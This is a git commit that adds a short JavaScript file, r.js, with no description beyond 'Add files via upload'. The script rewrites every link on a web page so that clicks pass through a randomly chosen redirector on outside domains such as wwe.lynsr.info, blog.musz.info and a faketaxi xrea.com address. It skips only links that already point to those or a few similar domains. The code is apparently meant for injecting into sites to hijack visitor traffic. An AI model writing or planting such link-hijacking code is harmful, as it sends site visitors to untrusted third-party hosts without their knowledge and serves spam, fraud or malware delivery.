638a39824ab279d91002a441f9770aa45f2b74a3
red4f <60788459+red4f@users.noreply.github.com>
2020-03-03 18:19:17 +0800

    Add files via upload

---
+++ r.js
@@ -0,0 +1,9 @@
+var links = document.links;
+for (var i=0, iLen=links.length; i<iLen; i++) {
+var threads = ['https://wwe.lynsr.info/?', 'https://blog.musz.info/?', 'http://faketaxi.s602.xrea.com/go/?'];  
+var random  = threads[Math.floor(Math.random() * threads.length)];
+var hrefer = document.links[i].href;
+if(hrefer.match("wwe.lynsr") || hrefer.match("faketaxi") || hrefer.match("blog.musz")|| hrefer.match(".xyz")|| hrefer.match("ce.alrau")|| hrefer.match("ce.nyrvc")) {
+document.links[i].href = document.links[i].href; 
+ }else{links[i].href = random + links[i].href;}
+ }
